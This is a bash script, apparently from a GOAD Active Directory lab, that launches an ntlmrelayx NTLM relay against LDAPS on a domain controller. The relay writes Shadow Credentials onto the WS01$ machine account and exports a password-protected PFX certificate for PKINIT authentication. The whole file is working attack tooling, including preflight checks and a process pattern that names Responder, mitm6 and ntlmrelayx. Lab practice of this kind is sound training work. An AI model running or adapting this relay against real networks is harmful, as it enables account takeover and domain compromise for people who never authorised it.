#!/usr/bin/env bash
# Start the controlled WS01$ -> WINTERFELL LDAPS Shadow Credentials relay.
# Foreground mode is intentional so the operator controls shutdown with Ctrl+C.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
BASELINE="${BASELINE:-$HOME/.config/kingdoms/phase03-shadow-baseline.json}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-shadow}"
PASSFILE="$WORK/pfx-password"
CERTBASE="$WORK/ws01-shadow"

cd "$ROOT"

bash "$ROOT/scripts/phase03/assert-wpad-exercise-clean.sh"

echo '===== SHADOW CREDENTIALS RELAY PREFLIGHT ====='
[[ -f "$BASELINE" ]] || { echo "FAIL: baseline missing: $BASELINE" >&2; exit 1; }
[[ "$(stat -Lc '%a' "$BASELINE")" == '600' ]] || { echo 'FAIL: baseline must be mode 600' >&2; exit 1; }

python3 - "$BASELINE" <<'PY'
import json, sys
data=json.load(open(sys.argv[1], encoding='utf-8'))
assert data['Target']=='WS01$'
print(f"BASELINE_KCL_COUNT={data['KCLCount']}")
print('PASS: exact WS01$ baseline loaded')
PY

if pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py|Responder[.]py|responder|mitm6)([ ]|$)' >/dev/null; then
  echo 'FAIL: conflicting Phase 03 attack runtime already exists' >&2
  pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py|Responder[.]py|responder|mitm6)([ ]|$)' || true
  exit 1
fi

sudo -v
if sudo -n ss -H -lnt 2>/dev/null | grep -Eq '(^|[[:space:]])[^[:space:]]*:80[[:space:]]'; then
  echo 'FAIL: TCP/80 is already in use' >&2
  sudo -n ss -H -lntp | grep -E ':80[[:space:]]' || true
  exit 1
fi

install -d -m 700 "$WORK"
if [[ ! -s "$PASSFILE" ]]; then
  umask 077
  python3 - "$PASSFILE" <<'PY'
import secrets, string, sys
alphabet=string.ascii_letters+string.digits+'!@#%_+-'
with open(sys.argv[1], 'w', encoding='utf-8') as f:
    f.write(''.join(secrets.choice(alphabet) for _ in range(28)))
PY
fi
chmod 600 "$PASSFILE"
PFX_PASSWORD="$(<"$PASSFILE")"

NTLMRELAYX="$(command -v impacket-ntlmrelayx 2>/dev/null || command -v ntlmrelayx.py 2>/dev/null || true)"
[[ -n "$NTLMRELAYX" ]] || { echo 'FAIL: ntlmrelayx not found' >&2; exit 1; }
HELP="$("$NTLMRELAYX" -h 2>&1 || true)"

for required in --shadow-credentials --shadow-target --pfx-password --export-type --cert-outfile-path --no-smb-server; do
  grep -Fq -- "$required" <<<"$HELP" || { echo "FAIL: ntlmrelayx missing $required" >&2; exit 1; }
done

rm -f -- "$CERTBASE.pfx"

ARGS=(
  -t "ldaps://$TARGET"
  --shadow-credentials
  --shadow-target 'WS01$'
  --export-type PFX
  --cert-outfile-path "$CERTBASE"
  --pfx-password "$PFX_PASSWORD"
  --no-smb-server
  --no-dump
  --no-da
  --no-acl
)

for optional in --no-wcf-server --no-raw-server --no-rpc-server --no-winrm-server --no-mssql-server --no-rdp-server; do
  if grep -Fq -- "$optional" <<<"$HELP"; then ARGS+=("$optional"); fi
done

echo "TARGET=ldaps://$TARGET"
echo 'SHADOW_TARGET=WS01$'
echo "PFX_BASE=$CERTBASE"
echo "PASSWORD_FILE=$PASSFILE (mode 600; password not printed)"
echo 'INFO: foreground mode is intentional.'
echo 'INFO: leave this process running, then use scripts/phase03/diagnostics/trigger-ws01-system-http.sh in another terminal.'
echo 'INFO: stop this relay with Ctrl+C only after the PKINIT consequence has been proven.'

exec sudo -n "$NTLMRELAYX" "${ARGS[@]}"
